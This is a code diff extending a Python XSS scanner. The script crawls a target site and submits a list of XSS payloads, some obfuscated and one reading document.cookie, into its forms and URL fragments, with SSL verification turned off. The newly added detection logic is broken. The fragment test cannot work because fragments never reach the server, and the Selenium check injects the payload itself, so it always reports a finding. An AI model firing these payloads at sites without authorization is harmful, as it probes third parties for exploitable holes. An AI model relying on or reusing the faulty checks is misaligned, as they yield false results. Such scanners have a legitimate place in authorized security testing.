@@ -9,6 +9,8 @@ import urllib3
 import time
 import random
 import threading
+from selenium import webdriver
+from selenium.webdriver.common.by import By
 
 # Disable SSL warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -24,7 +26,6 @@ XSS_PAYLOADS = [
     "<Script>alert('XSS')</scripT>",
     "<script>alert(document.cookie)</script>",
     "javascript:/*--></title></style></textarea></script><script>alert(1)//",
-    # More complex and obfuscated payloads
     "<svg/onload=confirm('XSS')>",
     "<img src='x' onerror='confirm(1)'>",
     "<a href='javascript:alert(1)'>Click me</a>",
@@ -36,12 +37,14 @@ XSS_PAYLOADS = [
 # Global variables
 crawled_links = set()
 
+
 # Function to print all crawled links
 def print_crawled_links():
     print(f"\n[+] Links crawled:")
     for link in crawled_links:
         print(f"    {link}")
     print()
+
 
 # Get all forms from a URL
 def get_all_forms(url):
@@ -51,6 +54,7 @@ def get_all_forms(url):
     except requests.exceptions.RequestException as e:
         print(f"[-] Error retrieving forms from {url}: {e}")
         return []
+
 
 # Extract form details (action, method, inputs)
 def get_form_details(form):
@@ -62,10 +66,23 @@ def get_form_details(form):
         input_type = input_tag.attrs.get("type", "text")
         input_name = input_tag.attrs.get("name")
         inputs.append({"type": input_type, "name": input_name})
+
+    # Handle other form elements like <select> and <textarea>
+    for select_tag in form.find_all("select"):
+        input_name = select_tag.attrs.get("name")
+        options = [
+            {"type": "select", "name": input_name, "options": [opt.text for opt in select_tag.find_all("option")]}]
+        inputs.extend(options)
+
+    for textarea_tag in form.find_all("textarea"):
+        input_name = textarea_tag.attrs.get("name")
+        inputs.append({"type": "textarea", "name": input_name})
+
     details["action"] = action
     details["method"] = method
     details["inputs"] = inputs
     return details
+
 
 # Submit a form with XSS payload
 def submit_form(form_details, url, payload):
@@ -73,7 +90,7 @@ def submit_form(form_details, url, payload):
     inputs = form_details["inputs"]
     data = {}
     for input in inputs:
-        if input["type"] in ["text", "search"]:
+        if input["type"] in ["text", "search", "textarea"]:
             input["value"] = payload
         input_name = input.get("name")
         input_value = input.get("value")
@@ -88,6 +105,7 @@ def submit_form(form_details, url, payload):
         print(f"[-] Error submitting form to {target_url}: {e}")
         return None
 
+
 # Get all links from a URL
 def get_all_links(url):
     try:
@@ -96,6 +114,15 @@ def get_all_links(url):
     except requests.exceptions.RequestException as e:
         print(f"[-] Error retrieving links from {url}: {e}")
         return []
+
+
+# Function to test for DOM-based XSS (URL Fragment Injection)
+def test_for_dom_based_xss(url, payload):
+    test_url = f"{url}#{payload}"
+    response = requests.get(test_url, verify=False)
+    if payload in response.text:
+        print(f"{Fore.GREEN}[+] DOM-based XSS found in URL fragment: {test_url}{Style.RESET_ALL}")
+
 
 # Function to handle XSS scanning
 def scan_xss(args, scanned_urls=None):
@@ -106,13 +133,13 @@ def scan_xss(args, scanned_urls=None):
     if args.url in scanned_urls:
         return False
     scanned_urls.add(args.url)
-    
+
     forms = get_all_forms(args.url)
     print(f"\n[+] Detected {len(forms)} forms on {args.url}")
-    
+
     parsed_url = urlparse(args.url)
     domain = f"{parsed_url.scheme}://{parsed_url.netloc}"
-    
+
     if args.obey_robots:
         robot_parser = RobotFileParser()
         robot_parser.set_url(urljoin(domain, "/robots.txt"))
@@ -125,7 +152,7 @@ def scan_xss(args, scanned_urls=None):
             crawl_allowed = robot_parser.can_fetch("*", args.url)
     else:
         crawl_allowed = True
-    
+
     if crawl_allowed or parsed_url.path:
         for form in forms:
             form_details = get_form_details(form)
@@ -142,13 +169,17 @@ def scan_xss(args, scanned_urls=None):
                             f.write(f"URL: {args.url}\n")
                             f.write(f"Form Details: {form_details}\n")
                             f.write(f"Payload: {payload}\n")
-                            f.write("-"*50 + "\n\n")
+                            f.write("-" * 50 + "\n\n")
                     form_vulnerable = True
                     break
-            
+
             if not form_vulnerable:
                 print(f"{Fore.MAGENTA}[-] No XSS vulnerability found on {args.url}{Style.RESET_ALL}")
-    
+
+    # Test URL fragments and query parameters for XSS
+    for payload in XSS_PAYLOADS:
+        test_for_dom_based_xss(args.url, payload)
+
     if args.crawl:
         print(f"\n[+] Crawling links from {args.url}")
         links = get_all_links(args.url)
@@ -162,12 +193,26 @@ def scan_xss(args, scanned_urls=None):
                 args.url = link
                 scan_xss(args, scanned_urls)
 
+
+# Headless Browser Automation (Optional for JavaScript-heavy websites)
+def test_js_payload_with_selenium(url, payload):
+    options = webdriver.ChromeOptions()
+    options.add_argument("--headless")
+    driver = webdriver.Chrome(options=options)
+    driver.get(url)
+    driver.execute_script(f"document.body.innerHTML += '<div>{payload}</div>'")
+    if payload in driver.page_source:
+        print(f"{Fore.GREEN}[+] XSS vulnerability found with Selenium on {url}{Style.RESET_ALL}")
+    driver.quit()
+
+
 # Main function
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Extended XSS Vulnerability scanner script.")
+    parser = argparse.ArgumentParser(description="Enhanced XSS Vulnerability scanner script.")
     parser.add_argument("url", help="URL to scan for XSS vulnerabilities")
     parser.add_argument("-c", "--crawl", action="store_true", help="Crawl links from the given URL")
-    parser.add_argument("-m", "--max-links", type=int, default=0, help="Maximum number of links to visit. Default 0, no limit.")
+    parser.add_argument("-m", "--max-links", type=int, default=0,
+                        help="Maximum number of links to visit. Default 0, no limit.")
     parser.add_argument("--obey-robots", action="store_true", help="Obey robots.txt rules")
     parser.add_argument("-o", "--output", help="Output file to save the results")
     args = parser.parse_args()
